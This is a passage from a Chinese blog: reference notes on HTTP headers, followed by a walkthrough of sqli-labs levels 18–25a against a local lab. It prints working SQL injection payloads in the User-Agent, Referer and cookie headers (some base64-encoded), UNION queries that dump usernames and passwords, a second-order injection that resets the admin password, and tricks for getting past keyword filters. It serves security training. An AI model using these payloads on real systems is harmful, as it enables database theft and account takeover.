<p>3.Accept_Ranges:web服务器表明自己是否接受获取其某个实体的一部分（比如文件的一部分）的请求。bytes：表示接受，none：表示不接受</p>
<p>4.Age：当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间。</p>
<p>5.Authorization:当客户端接收来自WEB服务器的WWW-Authenticate响应时，用该头部来回应自己的身份验证信息给WEB服务器</p>
<p>6.Cache-Control：</p>
<pre><code>请求：
no-cache（不要缓存的实体，要求现在从web服务器获取）
max-age:(只接受Age值小于max-age值，并没有过期的对象)
max-stale:(可以接受过期的对象，但是过期时间必须小于max-stale值)
min-fresh:（接受其新鲜生命期大于其当前Age跟min-fresh值之和的缓存对象）

响应：
public（可以使用Cached内容回应任何用户）
private(只能用缓存内容回应先前请求该内容的那个用户)
no-cache(可以缓存，但是只有跟web服务器验证其有效后，才能返回给客户端)
max-age： （本响应包含的对象的过期时间）
ALL：no-store（不允许缓存）</code></pre><p>7.Connection:</p>
<pre><code>请求：
close（告诉web服务器或者代理服务器，在完成本次请求的响应后断开连接，不要等待本次连接的后续请求）
keeplive（告诉web服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待本次连接的后续请求）

响应：
close（连接已经关闭）
keepalive(连接保持着，在等待本次连接的后续请求)
Keep-Alive：如果浏览器请求保持连接，则该头部表明希望WEB服务器保持连接多长时间（s），例如：Keep-Alive：300</code></pre><p>8.Content-Encoding:web服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象。例如：Content-Encoding:gzip</p>
<p>9.Content-Language:WEB服务器告知浏览器自己响应的对象的语言</p>
<p>10.Content-Length：web服务器告知浏览器自己响应的对象的长度。例如：Content-Length：26012</p>
<p>11.Content-Range: web服务器表明该响应包含的部分对象为整个对象的哪个部分。例如：Content-Range:bytes 21010-47021/47022</p>
<p>12.Content-Type:WEB服务器告知浏览器自己响应的对象的类型。例如:Content-Type:application/xml</p>
<p>13.Etag:就是一个对象（例如URL）的标志值，就对一个对象而言，比如一个html文件，如果被修改了，其ETag也会别修改，所以ETag的作用跟Last-Modified的作用差不多，主要供web服务器判断一个对象是否改变了。比如前一次请求某个html文件时，获得其ETag,当这次又请求这个文件时，浏览器就会把先前获得的ETag值发送给web服务器，然后web服务器就会把这个ETag跟该文件的当前ETag进行对比，然后就知道这个文件有没有改变。</p>
<p>14.Expired: web服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟web服务器验证了其有效性后，才能用来响应客户请求。是HTTP/1.0的头部。例如：Expires:Sat,23 May 2009 10:02:12 GMT</p>
<p>15:HostL:客户端指定自己想访问的web服务器的域名/IP地址和端口号。例如：Host：rss.sina.com.cn</p>
<p>16:If-Match:如果对象的ETag没有改变，意味着对象没有改变，才执行请求的动作。</p>
<p>17.If-None-Match：如果对象的ETag改变了，意味着对象也改变了，才执行请求的动作</p>
<p>18.If-Modified-Since:如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（比如返回对象），否则返回代码304，告知浏览器该对象没有修改。例如：If-Modified-Since:Thu, 10 Apr 2008 09:14:42 GMT</p>
<p>19.If-Unmodified-Since:如果请求的对象在该头部指定的时间之后没有修改过，才执行请求的动作（比如返回对象）</p>
<p>20.If-Range:浏览器告诉WEB服务器，如果浏览器请求的对象没有改变，就把缺少的部分给浏览器，如果对象改变了，就将整个对象给浏览器。浏览器通过发送请求对象的ETag或者自己所知道的最后修改时间给web服务器，让其判断对象是否改变。总跟Range头部一起使用。</p>
<p>21.Last-Modified：WEB服务器认为对象的修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified: Tue,06 May 2008 02:42:43 GMT</p>
<p>22.Location:Web服务器告知浏览器，试图访问的对象已经被转移到别的位置，到该头部指定的位置去取。例如：Location：<a href="http://i0.sinaimg.cn/dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif" target="_blank" rel="noopener">http://i0.sinaimg.cn/dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif</a>  </p>
<p>23.Pramga:主要使用 Pramga: no-cache,相当于Cache-Control: no-cache。例如：Pragma:no-cache</p>
<p>24.Proxy-Authenticate:代理服务器响应浏览器，要求其提供代理身份证验证信息。</p>
<pre><code>Proxy-Authorization:浏览器响应代理服务器的身份验证请求，提供自己的身份信息。</code></pre><p>25.Range:浏览器（例如：Flashget 多线程下载时）告知web服务器自己想取对象的哪部分。例如：Range:bytes=1173546-</p>
<p>26.Referer: 浏览器向web服务器自己是从哪个网页/URL获得/点击当前请求中的网址/URL。例如：Referer: <a href="http://www.sina.com/" target="_blank" rel="noopener">http://www.sina.com/</a></p>
<p>27.Server:web服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61（Unix）</p>
<p>28：User-Agent：浏览器表明自己的身份（是哪种浏览器）。例如：User-Agent: Mozilla/5.0<br>(Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 Firefox/2、 0、 0、 14  </p>
<p>29.Transfer-Encoding:web服务器表明自己对本响应消息体作什么编码，比如是否分块(chunked)。例如：Transfer-Encoding:chunked</p>
<p>30.Vary:WEB服务器用该头部的内容告诉Cache服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源web服务器在接到第一个请求消息时，其响应消息的头部为：Content-Encoding:gzip; Vary:Content-Encoding 那么Cache服务器会分析后续请求消息的头部，检查其Accept-Encoding，是否跟先前响应的Vary头部值一致，即是否使用相同的内容编码方法，这样就可以防止Cache服务器用自己Cache里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary: Accept-Encoding</p>
<p>31.Via:列出从客户端到OCS或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面添加Via头部，并填上自己的相关信息，当下一代代理服务器收到第一个代理服务器的请求时，会在自己发出的请求里面复制前一个代理服务器的请求Via头部，并把自己的相关信息加到后面，以此类推，当OCS收到最后一个代理服务器的请求时，检查Via头部，就知道该请求所经过的路由。例如：Via： 1.0 236.D0707195.sina.com.cn:80 (squid/2.6.STABLE13)  </p>
<h4 id="less18"><a href="#less18" class="headerlink" title="less18"></a>less18</h4><p>从源码中看到：</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname = check_input($_POST[<span class="string">'uname'</span>])<span class="comment">;</span></span><br><span class="line">$passwd = check_input($_POST[<span class="string">'passwd'</span>])<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>再本关卡对uname和passwd进行了check_input()函数处理，所以无法通过uname和passwd进行注入行不通，查看源码，发现sql语句：</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$insert=<span class="string">"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)"</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>将useragent和ip插入到数据库中，那么是否可以尝试用这个进行注入？IP地址我们一般无法更改，但是可以通过抓包软件修改useragent。使用burpsuite进行抓包并修改报文。</p>
<p><img src="/2019/12/27/sqli-labs-writeup/36.png" alt></p>
<p>从上图可以看到，当提供正确的账号密码之后前台可以显示user-agent并且内容是我们通过报文修改之后的，那么当我们将user-agent内容改为注入语句呢？</p>
<p>例如：</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user-agent: <span class="symbol">'and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="keyword">select</span> @@version),<span class="number">0</span>x7e)) <span class="keyword">and</span> <span class="string">'1'</span>='<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/37.png" alt></p>
<p>可以看到已经获取到版本号</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">user-agent: 'and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>)) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br><span class="line"><span class="string">//获取数据库名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">user-agent: '</span><span class="keyword">and</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>)) <span class="keyword">and</span><span class="string">'1'</span>=<span class="string">'1</span></span><br><span class="line"><span class="string">//获取security数据库下第一个表名  emails</span></span><br><span class="line"><span class="string">user-agent: '</span><span class="keyword">and</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">0x7e</span>)) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br><span class="line"><span class="string">//获取security数据库下第二个表名  referers</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string">可获取所有表名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">user-agent: '</span><span class="keyword">and</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>)) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br><span class="line"><span class="string">//获取users表中的列名</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string">参考之前的playload</span></span><br></pre></td></tr></table></figure>

<h4 id="less19"><a href="#less19" class="headerlink" title="less19"></a>less19</h4><p>查看本关卡的源码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$insert</span>=<span class="string">"INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('<span class="variable">$uagent</span>', '<span class="variable">$IP</span>')"</span>;</span><br></pre></td></tr></table></figure>

<p>可以看到，后台从服务器中获取了HTTP_REFERER,那就可以使用与less18一样的方式进行注入，但是需要从referer进行修改。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Referer: 'and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>)) <span class="keyword">and</span><span class="string">'1'</span>=<span class="string">'1</span></span><br><span class="line"><span class="string">//获取数据库版本</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Referer: '</span><span class="keyword">and</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>)) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br><span class="line"><span class="string">//获取数据库名称</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Referer: '</span><span class="keyword">and</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>)) <span class="keyword">and</span><span class="string">'1'</span>=<span class="string">'1</span></span><br><span class="line"><span class="string">//获取数据库表名</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string">参考上面的playload</span></span><br></pre></td></tr></table></figure>

<h4 id="less20"><a href="#less20" class="headerlink" title="less20"></a>less20</h4><p>查看该关卡源码,发现cookie从username中获取值后，当再次刷新时，会从cookie中读取username，然后进行查询。得知后台流程后，就可以进行注入了。</p>
<p>先在登录时burpsuite拦截登陆报文，将登陆报文直接发送，后又有一个GET报文，如下图：</p>
<p><img src="/2019/12/27/sqli-labs-writeup/38.png" alt></p>
<p>cookie成功获取uname，然后修改报文并发送</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cookie: uname=admin' <span class="keyword">and</span> <span class="built_in">extractvalue</span>(<span class="number">1</span>,<span class="built_in">concat</span>(<span class="number">0x7e</span>,(<span class="built_in">select</span> <span class="comment">@@</span>version),<span class="number">0x7e</span>))<span class="meta">#</span></span><br><span class="line"><span class="comment">//成功获取到数据库版本</span></span><br></pre></td></tr></table></figure>

<p>其余注入方式跟前面的一样，但是只能在burpsuite（拦截报文和修改报文工具）上进行，不然会获取不到相应的信息。</p>
<h4 id="less21"><a href="#less21" class="headerlink" title="less21"></a>less21</h4><p>直接键入正确的账号密码进行结果测试，发现在形式上与less20一致，区别在于返回的cookie获取到的uname使用base64进行加密。</p>
<p><img src="/2019/12/27/sqli-labs-writeup/40.png" alt></p>
<p>查看后台的源码</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setcookie('uname', base64_encode($row1['username']), time()<span class="number">+3600</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>所以我们在处理playload时先要将查询语句进行base64加密，然后与less20是一致的。然后再后端接受uname时对uname进行了单引号和括号处理。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//admin') and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>))<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">cookie：uname=YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSwweDdlKSkj</span><br></pre></td></tr></table></figure>

<p>这边有点奇怪，使用站长之家的base64加密方式放进去是无法注入出来的，最后使用的加密站点：<a href="https://www.bejson.com/enc/base64/才能注入出来，或许是加密的模式不一样吧。" target="_blank" rel="noopener">https://www.bejson.com/enc/base64/才能注入出来，或许是加密的模式不一样吧。</a></p>
<h4 id="less22"><a href="#less22" class="headerlink" title="less22"></a>less22</h4><p>该关卡直接键入admin账号密码发现返回是跟less21是一样的，查看源码发现，只是将uname的处理进行了改变，uname进行了双引号的处理。</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$coo</span>kee1 = <span class="string">'"'</span>. <span class="symbol">$coo</span>kee. <span class="string">'"'</span>;</span><br></pre></td></tr></table></figure>

<p>所以playload是跟前面一样的</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//admin" and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>))<span class="comment">#</span></span><br><span class="line">cookie:uname=YWRtaW4iIGFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IEBAdmVyc2lvbiksMHg3ZSkpIw==</span><br></pre></td></tr></table></figure>

<h2 id="第二部分-page-2-Adv-Injections"><a href="#第二部分-page-2-Adv-Injections" class="headerlink" title="第二部分/page-2 Adv Injections"></a>第二部分/page-2 Adv Injections</h2><h4 id="less23"><a href="#less23" class="headerlink" title="less23"></a>less23</h4><p>界面的提示与less1一样</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please input <span class="keyword">the</span> ID <span class="keyword">as</span> parameter <span class="keyword">with</span> <span class="keyword">numeric</span> <span class="built_in">value</span></span><br></pre></td></tr></table></figure>

<p>通过get方式进行传输参数ID，但是ID有什么特殊的处理，暂时还不知道。尝试通过id=1和id=1‘，发现有回显报错。</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near ''<span class="number">1</span>'' LIMIT <span class="number">0</span>,<span class="number">1</span>' at line <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>查看源码：</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="comment">//filter the comments out so as to comments should not work</span></span><br><span class="line">$reg = <span class="string">"/#/"</span>;</span><br><span class="line">$reg1 = <span class="string">"/--/"</span>;</span><br><span class="line">$replace = <span class="string">""</span>;</span><br><span class="line">$id = preg_replace($reg, $replace, $id);</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>

<p>通过源码发现，后端对id进行了<code>#</code>和<code>--</code>注释符号进行过滤，并对id进行单引号处理。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">23</span><span class="regexp">/?id=-1' union select 1,@@version,'3</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/41.png" alt></p>
<p>此时sql查询语句为：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">id</span>=<span class="string">'-1'</span> union select 1,@@version,<span class="string">'3'</span> limit 0,1</span><br></pre></td></tr></table></figure>

<p>explain:</p>
<ul>
<li><p>id=-1,sql查询语句执行了两个select语句，第一个select为id的选择语句，第二个为我们构造的select语句，只有一个数据可以输出，为让我们构造的数据可以正常输出，第一个select要没有输出结果，所以使用-1或者超过整个数据库所有数据都可以</p>
</li>
<li><p>-1’ union select 1,@@version,’3 第一个<code>‘</code>（单引号)闭合-1，第二个<code>&#39;</code>(单引号)闭合后面的，这样查询结果内容显示在username处</p>
</li>
<li><p>此处还可以使用报错注入和延时注入，使用 or ’1‘=’1 进行闭合</p>
<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/sqli-labs-master/Less-23/</span>?id=<span class="number">1</span><span class="string">' or extractvalue(1,concat(0x7e,database())) or '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//获取数据库名</span><br><span class="line">http://localhost/sqli-labs-master/Less-23/?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(schema_name)<span class="keyword">from</span> information_schema.schemata),<span class="string">'3</span></span><br><span class="line"><span class="string">//获取security数据库下的表格</span></span><br><span class="line"><span class="string">http://localhost/sqli-labs-master/Less-23/?id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span>),<span class="string">'3</span></span><br><span class="line"><span class="string">//获取users表中列名</span></span><br><span class="line"><span class="string">http://localhost/sqli-labs-master/Less-23/?id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span>),<span class="string">'3</span></span><br><span class="line"><span class="string">//获取用户名</span></span><br><span class="line"><span class="string">http://localhost/sqli-labs-master/Less-23/?id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(username) <span class="keyword">from</span> security.users <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="string">'3</span></span><br><span class="line"><span class="string">//获取用户密码</span></span><br><span class="line"><span class="string">http://localhost/sqli-labs-master/Less-23/?id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> security.users <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="string">'3</span></span><br></pre></td></tr></table></figure>

<h4 id="less24"><a href="#less24" class="headerlink" title="less24"></a>less24</h4><p>该关卡是二次排序注入的类型，二次排序注入也称为存储型的注入，就是讲可能导致sql注入的字符先y存储到数据库中，当再次调用这个恶意构造的字符时，就可以触发sql注入。二次排序注入的思路：</p>
<ul>
<li>通过构造ta数据的形式，在浏览器或者其他软件中提交HTTP数据报文请求到服务器进行处理，提交的数据报文请求中可能包含构造的sql语句或者命令</li>
<li>服务器端应用程序将提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出相应</li>
<li>向服务器发送第二个与第一个不同的请求数据信息</li>
<li>服务端收到提交的第二个请求信息后，为处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致第一次请求中构造的sql语句或者命令在服务器中被执行。</li>
<li>服务器返回执行的处理结果数据信息，可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。</li>
</ul>
<p>在该关卡中，我们主要的步骤是注册一个admin‘#的账号，接下来登陆该账号后进行修改密码，此时被修改的是admin密码。查看后端的源码：</p>
<p>pass_changge.php</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = "<span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">'$pass'</span> <span class="keyword">where</span> username=<span class="string">'$username'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$curr_pass'</span> <span class="string">";</span></span><br></pre></td></tr></table></figure>

<p>当修改admin’#密码时，将会执行</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update<span class="built_in"> users </span><span class="builtin-name">set</span> <span class="attribute">password</span>=<span class="string">'$pass'</span> where <span class="attribute">username</span>=<span class="string">'admin'</span>#' <span class="keyword">and</span> <span class="attribute">password</span>=<span class="string">'$curr_pass'</span><span class="string">";</span></span><br></pre></td></tr></table></figure>

<p>发现只会执行前半部分，即</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update<span class="built_in"> users </span><span class="builtin-name">set</span> <span class="attribute">password</span>=<span class="string">'$pass'</span> where <span class="attribute">username</span>=<span class="string">'admin'</span></span><br></pre></td></tr></table></figure>

<p>具体步骤</p>
<p>(1)初始数据库：</p>
<p><img src="/2019/12/27/sqli-labs-writeup/42.png" alt></p>
<p>(2)创建admin‘#账号</p>
<p><img src="/2019/12/27/sqli-labs-writeup/43.png" alt></p>
<p>此时查看数据库中的用户信息</p>
<p><img src="/2019/12/27/sqli-labs-writeup/44.png" alt></p>
<p>(3)登录admin’#账号，并修改密码</p>
<p><img src="/2019/12/27/sqli-labs-writeup/45.png" alt></p>
<p>(4)查看数据库中的变化</p>
<p><img src="/2019/12/27/sqli-labs-writeup/46.png" alt></p>
<p>可以看到数据库中已经将admin的密码改为123456</p>
<p>(5)使用admin  123456进行登录</p>
<p><img src="/2019/12/27/sqli-labs-writeup/47.png" alt></p>
<p>已经成功登录</p>
<h4 id="less25"><a href="#less25" class="headerlink" title="less25"></a>less25</h4><p>关键代码如下：</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, <span class="variable">$id</span>);			<span class="regexp">//strip</span> out OR (non <span class="keyword">case</span> sensitive)</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/AND/i'</span>,<span class="string">""</span>, <span class="variable">$id</span>);		<span class="regexp">//</span>Strip out AND (non <span class="keyword">case</span> sensitive)</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>

<p>本关卡主要是or  and过滤，学习怎么绕过or和and过滤，一般是以下几个思路：</p>
<ul>
<li>大小写变形 Or,OR,oR</li>
<li>编码，hex，urlencode</li>
<li>添加注释 <code>/*or*/</code></li>
<li>利用符号 and=&amp;&amp;   or=||</li>
<li>双写，oorr    anandd</li>
</ul>
<p>本关卡主要使用的是第四个方法</p>
<p>报错注入   or示例</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">172.18</span>.<span class="number">9.91</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">25</span><span class="regexp">/?id=1'|| extractvalue(1,concat(0x7e,database()))-- +</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/48.png" alt></p>
<p>And示例</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">172.18</span>.<span class="number">9.91</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">25</span><span class="regexp">/?id=1 &amp;&amp; 1=1</span></span><br></pre></td></tr></table></figure>

<p>但是后面的查询我不是很了解，我所使用的双写+union联合查询</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-25/?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(scheme_name) <span class="keyword">from</span> infoorrmation_schema.schemata <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/49.png" alt></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-25/?id=-1'union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> infoorrmation_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="comment">-- +</span></span><br><span class="line">//获取数据库表名</span><br><span class="line"><span class="keyword">http</span>://<span class="number">172.18</span><span class="number">.9</span><span class="number">.91</span>/sqli-labs-<span class="keyword">master</span>/<span class="keyword">Less</span><span class="number">-25</span>/?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">'nion select 1,2,group_concat(column_name) from infoorrmation_schema.columns where  table_name='</span><span class="keyword">users</span><span class="string">' -- +</span></span><br><span class="line"><span class="string">//获取users表中的列名</span></span><br><span class="line"><span class="string">http://172.18.9.91/sqli-labs-master/Less-25/?id=-1'</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,username,passwoorrd <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">5</span> <span class="comment">-- +</span></span><br><span class="line">//获取<span class="keyword">id</span>为<span class="number">5</span>的用户信息</span><br></pre></td></tr></table></figure>

<h4 id="less25a"><a href="#less25a" class="headerlink" title="less25a"></a>less25a</h4><p>关键代码</p>
